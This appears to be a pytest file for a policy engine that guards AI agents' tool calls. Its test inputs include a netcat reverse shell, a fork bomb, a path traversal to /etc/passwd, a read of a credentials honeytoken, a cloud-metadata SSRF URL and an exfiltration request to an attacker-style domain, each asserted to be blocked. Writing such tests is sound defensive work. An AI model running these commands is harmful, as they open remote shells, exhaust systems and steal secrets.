import pytest
from app.models import ToolCall, ToolType, DecisionType
from app.policy.engine import policy_engine

def test_allow_normal_workspace_file_read():
    call = ToolCall(
        agent_id="test-agent",
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "/workspace/report.md"}
    )
    decision, reason, rule_id, score = policy_engine.evaluate(call)
    assert decision == DecisionType.ALLOW
    assert rule_id == "POL-PASS"

def test_block_path_traversal():
    call = ToolCall(
        agent_id="test-agent",
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "/workspace/../../etc/passwd"}
    )
    decision, reason, rule_id, score = policy_engine.evaluate(call)
    assert decision == DecisionType.BLOCK
    assert "FS-002" in rule_id or "FS-001" in rule_id

def test_block_honeytoken_access():
    call = ToolCall(
        agent_id="test-agent",
        task_id="default-task",
        tool=ToolType.FILE,
        args={"op": "read", "path": "/home/sandbox/.aws/credentials"}
    )
    decision, reason, rule_id, score = policy_engine.evaluate(call)
    assert decision == DecisionType.BLOCK
    assert rule_id == "HT-001"

def test_block_banned_command_reverse_shell():
    call = ToolCall(
        agent_id="test-agent",
        task_id="default-task",
        tool=ToolType.SHELL,
        args={"cmd": "nc -e /bin/sh 10.0.0.1 4444"}
    )
    decision, reason, rule_id, score = policy_engine.evaluate(call)
    assert decision == DecisionType.BLOCK
    assert rule_id == "CMD-001"

def test_block_fork_bomb():
    call = ToolCall(
        agent_id="test-agent",
        task_id="default-task",
        tool=ToolType.SHELL,
        args={"cmd": ":(){ :|:& };:"}
    )
    decision, reason, rule_id, score = policy_engine.evaluate(call)
    assert decision == DecisionType.BLOCK
    assert rule_id == "CMD-001"

def test_block_metadata_ip_ssrf():
    call = ToolCall(
        agent_id="test-agent",
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": "http://169.254.169.254/latest/meta-data/"}
    )
    decision, reason, rule_id, score = policy_engine.evaluate(call)
    assert decision == DecisionType.BLOCK
    assert rule_id == "NET-003"

def test_block_unapproved_domain():
    call = ToolCall(
        agent_id="test-agent",
        task_id="default-task",
        tool=ToolType.HTTP,
        args={"method": "GET", "url": "http://evil-attacker-site.com/exfil"}
    )
    decision, reason, rule_id, score = policy_engine.evaluate(call)
    assert decision == DecisionType.BLOCK
    assert rule_id == "NET-004"
